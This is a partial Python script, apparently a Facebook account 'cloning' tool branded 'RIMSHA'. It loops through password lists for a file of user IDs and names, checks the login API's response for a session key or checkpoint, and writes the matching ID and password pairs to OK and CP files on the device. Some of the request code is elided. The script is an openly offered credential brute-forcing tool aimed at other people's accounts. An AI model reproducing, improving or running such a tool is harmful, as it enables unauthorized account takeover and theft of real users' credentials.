...
def ktm():
	print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/RIMSHA-OK.txt\n[•] CP IDS SAVE : /sdcard/RIMSHA-CP.txt');input('[•] Press Enter To Back Menu ');Main()
...
logo = ("""
\033[1;37md8888b. d888888b .88b  d88. .d8888. db   db  .d8b.  
\033[1;31m88  `8D   `88'   88'YbdP`88 88'  YP 88   88 d8' `8b 
\033[1;32m88oobY'    88    88  88  88 `8bo.   88ooo88 88ooo88 
\033[1;33m88`8b      88    88  88  88   `Y8b. 88~~~88 88~~~88 
\033[1;34m88 `88.   .88.   88  88  88 db   8D 88   88 88   88 
\033[1;35m88   YD Y888888P YP  YP  YP `8888Y' YP   YP YP   YP 
                                                    
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mRIMSHA RAJPOOT
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mNOTHONG
\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36mPERSONAL 
\033[1;37m══════════════════════════════════════════\n""")                                                    
os.system ('clear')

print("\033[1;32m[•] \033[1;33mFOLLOW MY FACEBOOK ID....!");time.sleep(0)
#os.system("xdg-open https://www.facebook.com/Rimsha.Fb.Tricks.master.980972")
def clear ():
	os.system('clear')
	print (logo)
def linex():
...
def Main():
	...
	if g == '1' :
		file()
	if g == '2':
		os.system("xdg-open https://www.facebook.com/Rimsha.Fb.Tricks.master.980972");Main()
	if g =='0':
...
def file():
		clear()
		print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/RIMSHA.txt");linex()
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m[\033[1;32mRIMSHA\033[1;37m] %s | \033[1;32mOK:-%s'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m[RIMSHA-OK] %s √ %s'%(ids,pas))
                                        open(f'/sdcard/RIMSHA-OK.txt', 'a').write(ids+' √ '+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\033[1;33m[RIMSHA-CP] '+ids+' ~ '+pas+'\033[1;97m')
                                                open(f'/sdcard/RIMSHA-CP.txt', 'a').write(ids+' ~ '+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/RIMSHA-CP.txt', 'a').write(ids+' ~ '+pas+'\n')
